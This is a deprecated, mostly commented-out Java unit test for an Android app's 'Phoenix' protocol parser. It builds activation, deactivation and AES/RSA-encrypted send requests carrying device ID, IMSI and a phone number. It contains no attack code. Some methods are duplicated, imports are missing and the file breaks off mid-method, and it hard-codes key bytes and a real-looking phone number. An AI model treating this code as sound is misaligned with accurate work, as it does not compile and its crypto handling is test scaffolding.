package com.vvt.phoenix.prot.test;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import javax.crypto.SecretKey;

import junit.framework.Assert;
import android.content.Context;
import android.util.Log;

import com.vvt.phoenix.config.Customization;
import com.vvt.phoenix.prot.command.CommandData;
import com.vvt.phoenix.prot.command.Languages;
import com.vvt.phoenix.prot.command.SendActivate;
import com.vvt.phoenix.prot.command.SendDeactivate;
import com.vvt.phoenix.prot.parser.ProtocolParser;
import com.vvt.phoenix.util.DataBuffer;

/**
 * @author tanakharn
 * @deprecated
 */
public class ParserTest {//implements AESEncryptListener, AESDecryptListener, CRC32Listener{
	//Debug Information
	private static final String TAG = "com.vvt.protocol.test.ParserTest";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ?  DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ?  DEBUG : false;	
	private static final boolean LOCAL_LOGE = Customization.DEBUG ?  DEBUG : false;

	private SecretKey mKey;
	// Fields
	private Context mContext;
	private FileInputStream mFileIn = null;
	private  FileOutputStream mFileOut = null;
	private byte[] mParsedEncryptedHeader;
	private static byte[][] expectedActivateSet = {							// Expected Result for Activate Parsing
		{0x0},																// Encryption Type
		{0x0, 0x0, 0x0, 0x1},												// session ID
		{0x0, 0x1},															// AES Key Length
		{0x0, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7},		// AES key
		{0x0, 0x0, 0x0, 0x20},												// crc32 = 32 (int)
		//{0x0, 0xA},															// request length = 10 (short)
		{0x0, 0x2},															// protocol version = 2 (short)
		{0x0, 0x5},															// productID = 5 (short)
		{0x3},																// product version length = 9 (byte)
		{(byte)0x46, (byte)0x58, (byte)0x53},	// product version = "FXS"
		{(byte)0x00, 0x04},														// config ID = 4 (short)
		{0x06},																	// device ID length = 6 (byte)
		{(byte)0x48, (byte)0x54, (byte)0x43, (byte)0x5F, (byte)0x4E, (byte)0x31},	// device ID = "HTC_N1"
		{0x0D},								// Activation Code length = 4 (byte)
		{0x30, 0x35, 0x32, 0x36, 0x34, 0x35, 0x32, 0x31, 0x33, 0x32, 0x33, 0x36, 0x35},			// Activation Code = "0526452132365"
		{0x01},								// Language = 1 (byte)
		{0x0C},								// phone num length
		{0x2B, 0x36, 0x36, 0x38, 0x36, 0x36, 0x39, 0x38, 0x30, 0x38, 0x30, 0x37},	// phone num = "+66866980807"
		{0x2},								// MCC length
		{0x36, 0x36},					// MCC = "66"
		{0x2},								// MNC length
		{0x30, 0x31},					// MNC = "01"
		{0x00, 0x02},						// Command Code = 2 (short)
		//end of client header
		{0x0c},								// Device Info length
		{0x47, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x20, 0x50, 0x68, 0x6F, 0x6E, 0x65},	// device info = "Google Phone"
		{0x02}, 							// device model length
		{0x4E, 0x31}, 						// device model = "N1"
		{0x0F},								// IMSI length
		{0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36},			// IMSI = "123456789123456"
		
	};
	private static byte[][] expectedDeactivateSet = {						// Expected Result for Deactivate Parsing
		{0x0, 0x0, 0x0, 0x20},												// crc32 = 32 (int)
		{0x0, 0xA},															// request length = 10 (short)
		{0x0, 0x2},															// protocol version = 2 (short)
		{0x0, 0x5},															// productID = 5 (short)
		{0x0A},																// product version length = 10 (byte)
		{(byte)0x54, (byte)0x68, (byte)0x65, (byte)0x20, (byte)0x53, (byte)0x65, (byte)0x63, (byte)0x6F, (byte)0x6E, (byte)0x64},	// product version = "The Second"
		{(byte)0x00, 0x04},														// config ID = 4 (short)
		{0x05},																	// device ID length = 5 (byte)
		{(byte)0x44, (byte)0x72, (byte)0x6F, (byte)0x69, (byte)0x64},	// device ID = "Droid"
		{0x04},								// Activation Code length = 4 (byte)
		{0x6A, 0x6B, 0x6C, 0x3B},			// Activation Code = "jkl;"
		{0x01},								// Language = 1 (byte)
		{0x00, 0x03}						// Command Code = 3 (short)
		//end of client header
	};
	
	public ParserTest(Context con){
		mContext = con;
	}
	
	public void testParseActivateNoEncrypt(){
		Log.v(TAG, "////////// Starting Parse Activate Test //////////");
		
		SendActivate req = new SendActivate();
		
		//1 set All header data
		setRequestHeader(req);
		
		//2 set Device Info
		req.setDeviceInfo("Google Phone");
		
		//3 set Device Model 
		req.setDeviceModel("N1");
		
		//4 set IMSI
		//req.setIMSI("123456789123456");
		
		//5 set platform id
		//req.setPlatformID(0);
		
		
		//ProtocolParser parser = new ProtocolParser();
		//byte[] result = parser.parseActivateRequest(req);
		//byte[] result = ProtocolParser.parseRequest(req, mContext);
		
		
		//byte[] parsed = ProtocolParser.parseClientRequest(req);
		//byte[] result = hardCodeHeader(parsed);
		//writeToFile("actv.noencrypt.dat", result);
		
		/*
		int n = result.length;
		int i = 0;	// run across result[]
		int j = 0;	// run across expectedSet row
		while(i<n){
			for(int k=0; k<expectedActivateSet[j].length; k++){
				try{
					Assert.assertEquals(expectedActivateSet[j][k], result[i]);
					Log.v(TAG, "case "+j+" byte "+k+" OK, result-> "+result[i]);
				}catch (Error e){
					Log.v(TAG, "Parser Test error at test case "+j+" byte "+k+" !!!");
				}
				i++;
			}
			j++;
		}
		Log.v(TAG, "////////// Parse Activate Test finished //////////");
		*/
		
		/*try {
			mFileOut = mContext.openFileOutput("actv.noencrypt.dat", Context.MODE_PRIVATE);
			mFileOut.write(result);
			mFileOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}*/
		
	}

	public void testParseDeactivate(){
		Log.v(TAG, "////////// Starting Parse Deactivate Test //////////");
		
		SendDeactivate req = new SendDeactivate();
		
		//1 set crc32
		// hard code = 32
		
		//2 set request length
		// hard code = 10
		
		//3 set protocol version
		/*req.setProtocolVersion(2);
		
		//4 set productID
		req.setProductId(5);
		
		//5 set product version
		req.setProductVersion("The Second");
		
		//6 set configID
		req.setConfId(4);
		
		//7 set deviceID
		req.setDeviceId("Droid");
		
		//8 set Activation Code
		req.setActivationCode("jkl;");
		
		//9 set Language
		//req.setLanguage(1);
		req.setLanguage(Languages.THAI);*/
		
		//10 set Command
		// not apply

		//ProtocolParser parser = new ProtocolParser();
		//byte[] result = parser.parseDeactivateRequest(req);
		//byte[] result = ProtocolParser.parseRequest(req, mContext);
		
		
		//byte[] result = ProtocolParser.parseClientRequest(req);
		
		/*
		int n = result.length;
		int i = 0;	// run across result[]
		int j = 0;	// run across expectedSet row
		while(i<n){
			for(int k=0; k<expectedDeactivateSet[j].length; k++){
				try{
					Assert.assertEquals(expectedDeactivateSet[j][k], result[i]);
					Log.v(TAG, "case "+j+" byte "+k+" OK, result-> "+result[i]);
				}catch (Error e){
					Log.v(TAG, "Parser Test error at test case "+j+" byte "+k+" !!!");
				}
				i++;
			}
			j++;
		}
		Log.v(TAG, "////////// Parse Deactivate Test finished //////////");
		*/
		/*
		try {
			fOut = context.openFileOutput("parseDeactivateTest.txt", Context.MODE_PRIVATE);
			fOut.write(result);
			fOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		*/
	}

	
	
	
	
	
	
	
	
	/*
	 * Below are disable methods since new design of Phoenix protocol not include Send command
	 */
	
/*
	public void testParseSendNoEncrypt(){

		//1 read payload and prepare for data in the kitchen :-D
		File file = mContext.getFileStreamPath("payload1.prot");
		int payloadSize = (int) file.length();
		Log.v(TAG, "Payload size = "+payloadSize);
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (FileNotFoundException e) {
			Log.e(TAG, "Can't find payload1.prot");
		}
		byte[] payloadData = new byte[payloadSize];
		try {
			int readed = fIn.read(payloadData);
			Log.v(TAG, "Read from file : "+readed);
		} catch (IOException e) {
			Log.e(TAG, "IOException while read");
		}
		//1.2 calculate payload's crc32
		CRC32 crc = new CRC32();
		crc.update(payloadData);
		int payloadCrc32 = (int) crc.getValue();
		
		//2 perform Send Request
		SendRequest req = new SendRequest();
		//2.1 set all header data
		setRequestHeader(req);
		//2.2 set encryption code
		req.setEncryptionCode(0);
		//2.3 set payload size
		req.setPayloadSize(payloadSize);
		//2.4 set compression code
		req.setCompressionCode(0);
		//2.5 set event count
		req.setEventCount(10);
		//2.6 set crc32 of payload
		req.setPayloadCrc32(payloadCrc32);
		
		//3 parsing request
		//byte[] tail = ProtocolParser.parseRequest(req, mContext);
		byte[] tail = ProtocolParser.parseRequest(req);
		
		//4 put head of request
		byte[] parsed = hardCodeHeader(tail);
		
		//5 append with payload data
		DataBuffer buffer = new DataBuffer();
		buffer.writeBytes(parsed.length, 0, parsed);
		buffer.writeBytes(payloadData.length, 0, payloadData);
		byte[] result = buffer.toArray();
		
		try {
			mFileOut = mContext.openFileOutput("send.noencrypt.dat", Context.MODE_PRIVATE);
			mFileOut.write(result);
			mFileOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
	}

	public void testParseSendWihtRSend(){
		//1 prepare file by split payload2.prot into two pieces of files
		//splitPayload();
		//1.1 read payload2 and prepare for data in the kitchen :-D
		File file = mContext.getFileStreamPath("payload2.prot");
		int payloadSize = (int) file.length();
		Log.v(TAG, "Payload size = "+payloadSize);
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (FileNotFoundException e) {
			Log.e(TAG, "Can't find payload2.prot");
		}
		//1.2 calculate split size
		int firstHalf = payloadSize/2;
		int remainingSize = payloadSize - firstHalf;
		//1.3 read and write first half to new file
		byte[] firstPayloadData = new byte[firstHalf];
		try {
			int readed = fIn.read(firstPayloadData);
			Log.v(TAG, "Read from file (first half) : "+readed);
		} catch (IOException e) {
			Log.e(TAG, "IOException while read");
		}
		try {
			mFileOut = mContext.openFileOutput("payload2first.prot", Context.MODE_PRIVATE);
			mFileOut.write(firstPayloadData);
			mFileOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		//1.4 read and write second half to new file
		byte[] secondPayloadData = new byte[remainingSize];
		try {
			int readed = fIn.read(secondPayloadData);
			Log.v(TAG, "Read from file (second half) : "+readed);
		} catch (IOException e) {
			Log.e(TAG, "IOException while read");
		}
		try {
			mFileOut = mContext.openFileOutput("payload2second.prot", Context.MODE_PRIVATE);
			mFileOut.write(secondPayloadData);
			mFileOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		//1.5 calculate crc32 of whole payload data
		DataBuffer crcBuffer = new DataBuffer();
		crcBuffer.writeBytes(firstHalf, 0, firstPayloadData);
		crcBuffer.writeBytes(remainingSize, 0, secondPayloadData);
		CRC32 crc = new CRC32();
		crc.update(crcBuffer.toArray());
		int payloadCrc32 = (int) crc.getValue();
		
		//2 perform Send request for first half (first 50%)
		SendRequest sendReq = new SendRequest();
		//2.1 set all header data
		setRequestHeader(sendReq);
		//2.2 set encryption code
		sendReq.setEncryptionCode(0);
		//2.3 set payload size
		sendReq.setPayloadSize(payloadSize);
		//2.4 set compression code
		sendReq.setCompressionCode(0);
		//2.5 set event count
		sendReq.setEventCount(20);
		//2.6 set crc32 of payload
		sendReq.setPayloadCrc32(payloadCrc32);
		
		//3 parsing Send request
		//byte[] sendTail = ProtocolParser.parseRequest(sendReq, mContext);
		byte[] sendTail = ProtocolParser.parseRequest(sendReq);
		
		//4 put head of request
		byte[] sendParsed = hardCodeHeader(sendTail);
		
		//5 append with first payload data
		DataBuffer buffer = new DataBuffer();
		buffer.writeBytes(sendParsed.length, 0, sendParsed);
		buffer.writeBytes(firstPayloadData.length, 0, firstPayloadData);
		byte[] sendResult = buffer.toArray();
		
		//6 write Send Request to file
		try {
			mFileOut = mContext.openFileOutput("send2.noencrypt.dat", Context.MODE_PRIVATE);
			mFileOut.write(sendResult);
			mFileOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		
		//7 perform RSend request for second half (second 50%)
		RSendRequest rSendReq = new RSendRequest();
		//7.1 set all header data
		setRequestHeader(rSendReq);
		//7.2 set size
		rSendReq.setSize(remainingSize);
		
		//8 parsing Send request
		//byte[] rSendTail = ProtocolParser.parseRequest(rSendReq, mContext);
		byte[] rSendTail = ProtocolParser.parseRequest(rSendReq);
		
		//9 put head of request
		byte[] rSendParsed = hardCodeHeader(rSendTail);
		
		//10 append with second payload data
		buffer = new DataBuffer();
		buffer.writeBytes(rSendParsed.length, 0, rSendParsed);
		buffer.writeBytes(secondPayloadData.length, 0, secondPayloadData);
		byte[] rSendResult = buffer.toArray();
		
		//11 write Send Request to file
		try {
			mFileOut = mContext.openFileOutput("rsend2.noencrypt.dat", Context.MODE_PRIVATE);
			mFileOut.write(rSendResult);
			mFileOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}

		
	}
	
	public void testParseActivateEncrypt(){
		//1 perform Activation Request
		ActivateRequest req = new ActivateRequest();
		//1.1 set All header data
		setRequestHeader(req);
		//1.2 set Device Info
		req.setDeviceInfo("Google Phone");
		//1.3 set Device Model 
		req.setDeviceModel("N1");
		//1.4 set IMSI
		req.setIMSI("123456789123456");
		
		//3 parsing request
		//byte[] tail = ProtocolParser.parseRequest(req, mContext);
		byte[] tail = ProtocolParser.parseRequest(req);
		
		//4 generate AES key
		SecretKey key = AESKeyGenerator.generate();
		
		//5 save AES key to file (for me usage)
		byte[] encodedKey = key.getEncoded();
		writeToFile("AESKey.dat", encodedKey);
		
		
		//6 encrypt tail data
		//AESCipher cipher = new AESCipher();
		byte[] encryptedTail = null;
		try {
			encryptedTail = AESCipher.encryptSynchronous(key, tail);
		} catch (InvalidKeyException e) {
			Log.e(TAG, "Invalid Key while encrypt tail");
		}
		
		//4 put head of request
		byte[] result = hardCodeHeader(key, encryptedTail);
		
		//5 success
		writeToFile("actv.encrypt.dat", result);
		
		
		//6 debug
		byte[] plaintext = null;
		try {
			plaintext = cipher.decrypt(key, encryptedTail);
		} catch (InvalidKeyException e) {
			Log.e(TAG, "Invalid Key while decrypt tail");
		}
		byte[] debug = hardCodeHeader(key, plaintext);
		writeToFile("decryptedActivation.dat", debug);
		
	}
	
	// encrypt header not encrypt payload
	public void testParseSendEncryptHeader(){
		//1 read payload and prepare for data in the kitchen :-D
		File file = mContext.getFileStreamPath("payload1.prot");
		int payloadSize = (int) file.length();
		Log.v(TAG, "Payload size = "+payloadSize);
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (FileNotFoundException e) {
			Log.e(TAG, "Can't find payload1.prot");
		}
		byte[] payloadData = new byte[payloadSize];
		try {
			int readed = fIn.read(payloadData);
			Log.v(TAG, "Read from file : "+readed);
		} catch (IOException e) {
			Log.e(TAG, "IOException while read");
		}
		//1.2 calculate payload's crc32
		CRC32 crc = new CRC32();
		crc.update(payloadData);
		int payloadCrc32 = (int) crc.getValue();

		//2 perform Send Request
		SendRequest req = new SendRequest();
		//2.1 set all header data
		setRequestHeader(req);
		//2.2 set encryption code
		req.setEncryptionCode(0);
		//2.3 set payload size
		req.setPayloadSize(payloadSize);
		//2.4 set compression code
		req.setCompressionCode(0);
		//2.5 set event count
		req.setEventCount(10);
		//2.6 set crc32 of payload
		req.setPayloadCrc32(payloadCrc32);
		
		//3 parsing request
		byte[] tail = ProtocolParser.parseRequest(req);
		
		//4 generate AES key
		SecretKey key = AESKeyGenerator.generate();
		
		//5 save AES key to file (for me usage)
		byte[] encodedKey = key.getEncoded();
		writeToFile("AESKey.dat", encodedKey);
		
		//6 encrypt tail data
		//AESCipher cipher = new AESCipher();
		byte[] encryptedTail = null;
		try {
			encryptedTail = AESCipher.encryptSynchronous(key, tail);
		} catch (InvalidKeyException e) {
			Log.e(TAG, "Invalid Key while encrypt tail");
		}
		
		//4 put head of request
		byte[] parsed = hardCodeHeader(key, encryptedTail);
		
		//5 append with payload data
		DataBuffer buffer = new DataBuffer();
		buffer.writeBytes(parsed.length, 0, parsed);
		buffer.writeBytes(payloadData.length, 0, payloadData);
		byte[] result = buffer.toArray();
		
		try {
			mFileOut = mContext.openFileOutput("send.encrypt1.dat", Context.MODE_PRIVATE);
			mFileOut.write(result);
			mFileOut.close();
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		
	}
	
	public void testParseSendEncryptAll(){
		//1 read payload and prepare for data in the kitchen :-D
		File file = mContext.getFileStreamPath("payload3.prot");
		int payloadSize = (int) file.length();
		Log.v(TAG, "Payload size = "+payloadSize);
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (FileNotFoundException e) {
			Log.e(TAG, "Can't find payload1.prot");
		}
		byte[] payloadData = new byte[payloadSize];
		try {
			int readed = fIn.read(payloadData);
			Log.v(TAG, "Read from file : "+readed);
			fIn.close();
		} catch (IOException e) {
			Log.e(TAG, "IOException while read or close");
		}
		
		//1.2 generate AES key
		SecretKey key = AESKeyGenerator.generate();
		writeToFile("AESKey", key.getEncoded());
		
		//1.3 encrypt payload data
		byte[] cipherPayload = null;
		try {
			cipherPayload = AESCipher.encryptSynchronous(key, payloadData);
		} catch (InvalidKeyException e2) {
			// TODO Auto-generated catch block
			e2.printStackTrace();
		}
		int payloadCipherSize = cipherPayload.length;
		// TODO for me use
		writeToFile("payloadEncrypted.dat", cipherPayload);
		
		//1.4 calculate payload cipher crc32
		CRC32 crc = new CRC32();
		crc.update(cipherPayload);
		int payloadCrc32 = (int) crc.getValue();
		
		//2 perform Send Request
		SendRequest req = new SendRequest();
		//2.1 set all header data
		setRequestHeader(req);
		//2.2 set encryption code
		req.setEncryptionCode(1);
		//2.3 set payload cipehr size
		req.setPayloadSize(payloadCipherSize);
		//2.4 set compression code
		req.setCompressionCode(0);
		//2.5 set event count
		req.setEventCount(25);
		//2.6 set crc32 of payload
		req.setPayloadCrc32(payloadCrc32);
		
		//3 parsing request
		byte[] tail = ProtocolParser.parseRequest(req);
		
		
		
		//TODO for me usage
		//mKey = key;
		
		//5 save AES key to file (for me usage)
		//byte[] encodedKey = key.getEncoded();
		//writeToFile("AESKey.dat", encodedKey);
		
		//6 encrypt tail data
		//AESCipher cipher = new AESCipher();
		byte[] encryptedTail = null;
		try {
			encryptedTail = AESCipher.encryptSynchronous(key, tail);
		} catch (InvalidKeyException e) {
			Log.e(TAG, "Invalid Key while encrypt tail");
		}
		
		//7 calculate CRC32 of tail
		crc = new CRC32();
		crc.update(encryptedTail);
		int headCrc32 = (int) crc.getValue();
		DataBuffer buffer = new DataBuffer();
		buffer.writeInt(headCrc32);
		buffer.writeBytes(encryptedTail.length, 0, encryptedTail);
		
		//4 put head of request
		byte[] parsed = hardCodeHeader(key, buffer.toArray());
		//4.1 transfer parsed data to global variable
		mParsedEncryptedHeader = parsed;
		
		//5 append with encrypted payload
		buffer = new DataBuffer();
		buffer.writeBytes(parsed.length, 0, parsed);
		buffer.writeBytes(cipherPayload.length, 0, cipherPayload);
		
		writeToFile("send.encrypt_all.dat", buffer.toArray());
		
		
		
		//5 encrypt payload
		//5.1 re-open payload
		try {
			mFileIn = new FileInputStream(file);
		} catch (FileNotFoundException e1) {
			Log.e(TAG, "Can't find payload1.prot");
		}
		//5.2 prepare file for output cipher
		try {
			mFileOut = mContext.openFileOutput("payload1Cipher.dat", Context.MODE_PRIVATE);
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		//5.3 initiate and run AESCipher thread
		AESCipher cipherThread = new AESCipher();
		cipherThread.encryptASynchronous(key, mFileIn, mFileOut, this);
		cipherThread.start();
		// when finish this will call AESEncryptSuccess(), otherwise call AESEncryptError()
	 	
	}
	
	public void testParseNewSendEncryptAll(){
		//1 prepare input payload
		File file = mContext.getFileStreamPath("payload3.prot");
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (FileNotFoundException e) {
			Log.e(TAG, "Can't find payload1.prot");
		}
		
		//2 prepare output file
		FileOutputStream fOut = null;
		try{
			fOut = mContext.openFileOutput("payload3Cipher.dat", Context.MODE_PRIVATE);
		}catch(IOException ioex){
			Log.e(TAG, "Exception when oper cipher file");
		}
		
		//3 generate AES key
		SecretKey key = AESKeyGenerator.generate();
		mKey = key;
		
		
		//4 initiate and run AESCipher thread (encrypting Payload)
		AESCipher cipherThread = new AESCipher();
		//cipherThread.encryptASynchronous(key, fIn, fOut, this);
		try {
			cipherThread.encryptASynchronous(key, "payload3.prot", "payload3Cipher.dat", this);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (SecurityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		// when finish this will call AESEncryptSuccess(), otherwise call AESEncryptError()
		
		
	}
	
	public void testCipherThread(){
		//1 generate AES key
		SecretKey key = AESKeyGenerator.generate();
		mKey = key;
		
		//2 open input data
		File file = mContext.getFileStreamPath("abc.dat");
		int payloadSize = (int) file.length();
		Log.v(TAG, "Payload size = "+payloadSize);
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (FileNotFoundException e) {
			Log.e(TAG, "Can't find payload1.prot");
		}
		
		//3 prepare output cipher
		FileOutputStream fOut = null;
		try {
			fOut = mContext.openFileOutput("abcCipher.dat", Context.MODE_PRIVATE);
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		
		//4 initiate and run AESCipher thread
		AESCipher cipherThread = new AESCipher();
		cipherThread.encryptASynchronous(key, fIn, fOut, this);
		//cipherThread.start();
		// when finish this will call AESEncryptSuccess(), otherwise call AESEncryptError()
		
		Log.v(TAG, "ParserTest thread still running : in testCipherThread()");
		
	}
	
	public void testRSA(){
		
		//1 get RSA keys
		RSAKeyGenerator rsaKeyGen = new RSAKeyGenerator();
		rsaKeyGen.generate();
		RSAPublicKey pk = (RSAPublicKey) rsaKeyGen.getPublicKey();
		RSAPrivateKey prk = (RSAPrivateKey) rsaKeyGen.getPrivateKey();
		
		//2 build AES key
		//byte[] aesKey = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7};
		byte[] aesKey = {9, 1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6};
		
		//3 encrypt and write cipher to file
		byte[] cipherText = RSACipher.encryptSynchronous(pk, aesKey);
		writeToFile("RSACipher.dat", cipherText);
		
		//4 decrypt and write plain text to file
		byte[] plainText = RSACipher.decryptSynchronous(prk, cipherText);
		writeToFile("RSAPlainText.dat", plainText);
		
		
		//1 read raw key from file
		byte[] rawPublicKey = readFromFile("serverRawKey.dat");
		
		//2 creat server public key from raw data
		RSAPublicKey serverPk = RSAKeyGenerator.generatePublic(rawPublicKey);
		
		//3 create AES key
		SecretKey aesKey = AESKeyGenerator.generate();
		
		//4 encrypt AES key
		byte[] aesKeyCipher = null;
		try {
			aesKeyCipher = RSACipher.encrypt(serverPk, aesKey.getEncoded());
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		//5 write AES key (encrypted) to file
		writeToFile("AESEncryptedKey.dat", aesKeyCipher);
		
		
	}
	
	///////////////////////////////////// Thread Listener Methods ///////////////////////////////////////////////
	
	//call back for testParseNewSendEncryptAll()
	@Override
	public void onAESEncryptSuccess(FileInputStream result){
		if(LOCAL_LOGV)Log.v(TAG, "AESEncryptSuccess() called");
		//1 read cipher file
		//byte[] payloadCipherText = readFromFile("payload3Cipher.dat");
		byte[] payloadCipherText = null;
		try {
			payloadCipherText = FileUtil.readBytes(result);
		} catch (FileNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (SecurityException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		//2 calculate payload cipher crc32
		CRC32 crc = new CRC32();
		crc.update(payloadCipherText);
		int payloadCipherCrc32 = (int) crc.getValue();
		
		//3 perform Send Request
		SendRequest req = new SendRequest();
		//3.1 set all header data
		setRequestHeader(req);
		//3.2 set encryption code
		req.setEncryptionCode(1);
		//3.3 set payload size
		req.setPayloadSize(payloadCipherText.length);
		//3.4 set compression code
		req.setCompressionCode(0);
		//3.5 set event count
		req.setEventCount(25);
		//3.6 set crc32 of payload
		req.setPayloadCrc32(payloadCipherCrc32);
		
		//4 parsing request
		byte[] tail = ProtocolParser.parseRequest(req);
		
		//5 encrypt cipher tail
		byte[] cipherHead = null;
		try {
			cipherHead = AESCipher.encryptSynchronous(mKey, tail);
		} catch (InvalidKeyException e) {
			Log.e(TAG, "Invalid mKey");
		}
		
		//6 calculate CRC32 of cipherHead
		crc = new CRC32();
		crc.update(cipherHead);
		int headerCipherCrc32 = (int) crc.getValue();
		
		//7 put crc32 to head
		DataBuffer buffer = new DataBuffer();
		buffer.writeInt(headerCipherCrc32);
		buffer.writeBytes(cipherHead.length, 0, cipherHead);
		
		//8 put header
		byte[] parsed = hardCodeHeader(mKey, buffer.toArray());
		
		//9 append with payload cipher
		buffer = new DataBuffer();
		buffer.writeBytes(parsed.length, 0, parsed);
		buffer.writeBytes(payloadCipherText.length, 0,payloadCipherText);
		
		//10 write to file
		writeToFile("SendRequest.dat", buffer.toArray());
	}
	
	@Override
	public void onAESEncryptError(Exception err) {
		// TODO Auto-generated method stub
		Log.e(TAG,"AESEncryptor Error");
	}
	
	
	//call back for testParseSendEncryptAll()
	@Override
	public void AESEncryptSuccess() {
		// TODO Auto-generated method stub
		//1 open cipher file
		File file = mContext.getFileStreamPath("payload1Cipher.dat");
		int fileSize = (int) file.length();
		try {
			mFileIn = new FileInputStream(file);
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		//2 read cipher
		byte[] cipher = new byte[fileSize];
		try {
			mFileIn.read(cipher);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//3 append parsed header with cipher playload
		DataBuffer result = new DataBuffer();
		result.writeBytes(mParsedEncryptedHeader.length, 0, mParsedEncryptedHeader);
		result.writeBytes(fileSize, 0, cipher);
		
		//4 write output to file
		writeToFile("send.encrypt3.dat", result.toArray());
		

		//5 decrypt payload (for me usage)
		//5.1 open payload cipher
		file = mContext.getFileStreamPath("payload1Cipher.dat");
		try {
			mFileIn = new FileInputStream(file);
		} catch (FileNotFoundException e1) {
			Log.e(TAG, "Can't find payload1Cipher.dat");
		}
		//5.2 prepare file for output plain text
		try {
			mFileOut = mContext.openFileOutput("payload1PlainText.dat", Context.MODE_PRIVATE);
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		//5.3 initiate and run AESCipher thread
		AESCipher cipherThread = new AESCipher(mKey, mFileIn, mFileOut, this);
		//AESCipher cipherThread = new AESCipher(key, mFileIn, mFileOut, this);
		cipherThread.decryptASynchronous();
		cipherThread.start();
		// when finish this will call AESDecryptSuccess(), otherwise call AESDecryptError()

	}
	
	
	
	
//call back for testCipherThread()
	@Override
	public void AESEncryptSuccess() {
		Log.v(TAG, "AESEncryptSucces() called");
		
		//1 open cipher file
		File file = mContext.getFileStreamPath("abcCipher.dat");
		int fileSize = (int) file.length();
		FileInputStream fIn = null;
		try {
			fIn = new FileInputStream(file);
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		//2 prepare output plaintext
		FileOutputStream fOut = null;
		try {
			fOut = mContext.openFileOutput("abcPlain.dat", Context.MODE_PRIVATE);
		} catch (Exception e) {
			Log.e(TAG, "Exception when opening file");
			e.printStackTrace();
		}
		//3 initiate and run AESCipher thread
		AESCipher cipherThread = new AESCipher();
		cipherThread.decryptASynchronous(mKey, fIn, fOut, this);
		//cipherThread.start();
		// when finish this will call AESDecryptSuccess(), otherwise call AESDecryptError()
		Log.v(TAG, "ParserTest thread still running : in AESEncryptSuccess()");
		
	}
	
	@Override
	public void onAESDecryptError(Exception err) {
		// TODO Auto-generated method stub
		Log.e(TAG, "AESDecryptError called");
	}

	@Override
	public void onAESDecryptSuccess(FileInputStream result) {
		// TODO Auto-generated method stub
		Log.v(TAG, "AESDecryptSucces() called");
		try {
			result.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	public void testParseResponse(){
		byte[] rawResponse = readFromFile("serverResponse.dat");
		ServerResponse serverR = null;
		try {
			serverR = ProtocolParser.parseResponse(rawResponse);
		} catch (DataCorruptedException e) {
			if(LOCAL_LOGE)Log.e(TAG, "DataCorruptedException: "+e.getMessage());
		}
		
		if(serverR.getCmdEcho() == Command.ACTIVATE){
			ActivateResponse actR = (ActivateResponse) serverR;
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getCmdEcho());
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getEncryptionType());
			//if(LOCAL_LOGV)Log.v(TAG, ""+actR.getChecksum());
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getServerID());
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getStatusCode());
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getMessage());
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getExtendedStatus());
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getMD5());
			if(LOCAL_LOGV)Log.v(TAG, ""+actR.getConfigID());
		}
		
	}
	
	public void testParseResponse(){
		//1 prepare response data
		DataBuffer buffer = new DataBuffer();
		//1.1 put server ID : short 2 bytes 
		buffer.writeShort((short) 7);
